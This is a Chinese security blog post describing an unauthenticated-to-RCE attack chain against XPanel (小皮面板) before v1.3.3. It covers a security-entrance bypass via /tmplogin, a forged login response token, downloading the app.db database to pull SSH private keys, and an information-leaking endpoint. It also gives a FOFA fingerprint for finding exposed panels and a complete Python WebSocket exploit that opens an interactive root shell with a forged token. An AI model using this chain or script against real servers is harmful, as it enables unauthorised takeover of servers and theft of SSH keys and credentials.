#  小皮面板从未授权到RCE   
原创 clockwise  Clock安全   2025-05-12 12:37  
  
影响版本：XPanel v1.3.3之前  
  
存在鉴权绕过，可构造恶意请求直接访问后台管理接口，结合任意文件下载获取数据库文件，并提取ssh私钥，实现RCE。  
  
fofa：icon_hash="-1458616391"  
### 绕过安全入口及未授权进入后台  
  
由于小皮面板有安全入口，访问登录页面需要先获取的每个账号对应的随机字符串，例如:x.x.x.x:6666/4e4rv3  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hUqhnDMibdnKic7x9y1Ls6tLO3CDFRFEkMVOVfosPZ4RP6KvvgZIkpUf0K5973mc4WrRJib2IKUvXBbNlGiaENrBGA/640?wx_fmt=png&from=appmsg "")  
  
但是可以通过访问/tmplogin  
路由，进行绕过，直接到达登录口。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hUqhnDMibdnKic7x9y1Ls6tLO3CDFRFEkMqXiabAojpmnWyD2cOE9gbdicg6MG705A84CXHIA6QrAddEuUgWRDkLEQ/640?wx_fmt=png&from=appmsg "")  
  
首先在登录口，由于后台未做校验，直接替换响应包的内容即可绕过  
```
{"code":1000,"data":{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NDYzMzM2NjYsImlhdCI6MTc0NTcyODg2NiwiaXNzIjoieHAiLCJuYmYiOjE3NDU3Mjg4NjYsInVzZXJfaWQiOjEsImFjY291bnQiOiJhNjFjYTQxZCIsInRlbXAiOmZhbHNlfQ.xC1vSZnWhYykBEKdiRUqf2SbTifmwZfpwHREqy8SyYI"},"message":"登录成功"}

```  
  
并且登录之后不会有日志  
  
这里只要注册账号，获得一个可以成功登录的token，即可用在任意服务器上登录了。  
### 获取SSH密钥  
  
登录成功之后可以下载数据库文件xp/db/app.db  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hUqhnDMibdnKic7x9y1Ls6tLO3CDFRFEkMR5ric7PN53mfkeEBfl9cjnMicwOR3bLuDlqsS4iacQGiaaXWTK3pMDcyEg/640?wx_fmt=png&from=appmsg "")  
  
保存到本地之后使用navicat打开，直接导入表会报错，这里我用的是新建连接一个SQLite，并且选中app.db进行连接。  
  
在terminal表中可以获取SSH的RSA私钥  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hUqhnDMibdnKic7x9y1Ls6tLO3CDFRFEkMaB5RpiaJClu1o5Z8PqMSDpYamuTSGibupqkYY2zNeunVRfm8n8aSKC6w/640?wx_fmt=png&from=appmsg "")  
  
保存为key.pem  
，然后使用私钥连接SSH即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hUqhnDMibdnKic7x9y1Ls6tLO3CDFRFEkMaB5RpiaJClu1o5Z8PqMSDpYamuTSGibupqkYY2zNeunVRfm8n8aSKC6w/640?wx_fmt=png&from=appmsg "")  
### 信息泄露  
  
小皮的主程序在/xp/panel/app  
，我们通过go tool将主程序编译为汇编代码  
```
go tool objdump -S app > xp.asm 

```  
  
然后可以根据规则去搜索⾯板相关接⼝，有些接⼝在⾯板⾥没有使⽤到，但是可以直接调⽤的。  
  
例如这个未授权接口会泄露面板的用户名、key、安全入口、端口、版本号等信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hUqhnDMibdnKic7x9y1Ls6tLO3CDFRFEkMQtoEiaGOWy1C9TWgmsqDibubCu8XKyibicRCZIILRRYQDR5s8mF19JMEGQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hUqhnDMibdnKic7x9y1Ls6tLO3CDFRFEkMMTSltHicbrtnwibF87QTqR1icCQynUABhGJXsrpjibJHLdpUQ9xcKcpuRA/640?wx_fmt=png&from=appmsg "")  
### 无需入口RCE  
  
小皮的终端连接无需安全面板，通过WS协议通信执行命令，只需要伪造token即可连接服务器执行命令  
```
#!/usr/bin/env python3
import sys
import asyncio
import websockets
from typing import Optional

class WebSSHClient:
    def __init__(self, host: str):
        self.websocket: Optional[websockets.WebSocketClientProtocol] = None
        self.host = host
        self.auth_token = "伪造的身份标识"
        self.connected = False

    async def connect(self) -> None:
        """Establish WebSocket connection and authenticate"""
        uri = f'ws://{self.host}/wsSsh/wsSsh?machineId=1&token={self.auth_token}'
        try:
            self.websocket = await websockets.connect(uri)
            await self._authenticate()
            self.connected = True
        except Exception as e:
            print(f"Connection failed: {str(e)}")
            raise

    async def _authenticate(self) -> None:
        """Handle authentication process"""
        if not self.websocket:
            raise ConnectionError("WebSocket not initialized")

        await self.websocket.send('1')
        response = await self.websocket.recv()

        if "Last login" in response:
            print('Authentication successful!')
        else:
            print(f"Server response: {response}")

    async def run_shell(self) -> None:
        """Main interactive shell loop"""
        if not self.connected:
            print("Not connected to server")
            return

        print("\nInteractive shell (type 'exit' to quit)")
        while True:
            try:
                command = input("root@localhost# ").strip()
                if not command:
                    continue

                if command.lower() in ('exit', 'quit'):
                    print("Closing connection...")
                    await self.close()
                    return

                await self._send_command(command)
                response = await self.websocket.recv()
                print(response)

            except KeyboardInterrupt:
                print("\nUse 'exit' or 'quit' to end the session")
            except Exception as e:
                print(f"Error: {str(e)}")
                await self.close()
                return

    async def _send_command(self, command: str) -> None:
        """Format and send command to server"""
        if not self.websocket:
            raise ConnectionError("WebSocket not initialized")

        formatted_cmd = f'{{"type":2,"msg":"{command}\\r"}}'
        await self.websocket.send(formatted_cmd)

    async def close(self) -> None:
        """Cleanly close the connection"""
        if self.websocket and not self.websocket.closed:
            await self.websocket.close()
        self.connected = False

async def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <host>")
        sys.exit(1)

    host = sys.argv[1]
    client = WebSSHClient(host)

    try:
        await client.connect()
        await client.run_shell()
    except Exception as e:
        print(f"Fatal error: {str(e)}")
    finally:
        if client.connected:
            await client.close()

if __name__ == "__main__":
    try:
        asyncio.get_event_loop().run_until_complete(main())
    except KeyboardInterrupt:
        print("\nSession terminated by user")

```  
  
  
  
